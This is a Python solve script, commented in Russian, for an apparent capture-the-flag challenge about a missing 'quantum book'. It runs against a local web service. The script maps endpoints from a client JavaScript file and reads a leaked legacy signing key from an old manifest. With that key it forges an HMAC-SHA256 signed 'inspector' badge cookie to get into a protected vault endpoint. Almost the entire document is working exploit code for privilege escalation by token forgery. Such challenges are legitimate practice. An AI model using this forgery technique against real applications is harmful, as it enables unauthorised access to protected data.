#!/usr/bin/env python3
"""Эксплойт для «Дела о пропавшей квантовой книге».

Киллчейн:
  1. /assets/terminal.js называет три эндпоинта: /badge, /vault,
     /assets/old-manifest.json.
  2. /badge выдаёт валидный visitor-бейдж — формат
     base64url(json).base64url(hmac-sha256).
  3. /vault с visitor-бейджем отвечает 403 «vault is inspector-grade» —
     это подсказка нужной роли.
  4. В old-manifest.json утёк legacy_signing_key — куём бейдж
     {"role":"inspector"} и подписываем HMAC-SHA256.

Запуск:  python3 solve.py [url]   (по умолчанию http://127.0.0.1:13435)
"""

import base64
import hashlib
import hmac
import json
import sys
import urllib.error
import urllib.request

url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:13435"
base = url.rstrip("/")


def get(path: str, cookie: str | None = None) -> tuple[int, bytes]:
    """GET с опциональной cookie; HTTP-ошибку возвращаем как (код, тело) — 403 нужен ниже."""
    req = urllib.request.Request(base + path)
    if cookie:
        req.add_header("Cookie", cookie)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


# 1. карта эндпоинтов из клиентского скрипта
_, js = get("/assets/terminal.js")
assert b"badgeEndpoint" in js and b"ledgerEndpoint" in js, "нет карты эндпоинтов"

# 2. легитимный visitor-бейдж — подтверждение формата
code, badge = get("/badge")
assert code == 200 and badge.count(b".") == 1, "badge-эндпоинт недоступен"

# 3. отказ vault называет нужную роль
code, reject = get("/vault", cookie="badge=" + badge.decode())
assert code == 403 and b"inspector" in reject, "vault не назвал роль"

# 4. утёкший ключ из манифеста -> куём inspector-бейдж
_, manifest = get("/assets/old-manifest.json")
key = json.loads(manifest)["legacy_signing_key"].encode()

# повторяем формат легитимного бейджа: payload — base64url без padding
payload = base64.urlsafe_b64encode(b'{"role":"inspector"}').rstrip(b"=")
# подпись — HMAC-SHA256 от payload утёкшим ключом, тоже base64url без «=»
sig = base64.urlsafe_b64encode(
    hmac.new(key, payload, hashlib.sha256).digest()
).rstrip(b"=")

# идём в хранилище с куённым inspector-бейджем вместо visitor
code, body = get("/vault", cookie="badge=" + (payload + b"." + sig).decode())
print(body.decode())
assert code == 200, "куённый бейдж отклонён"
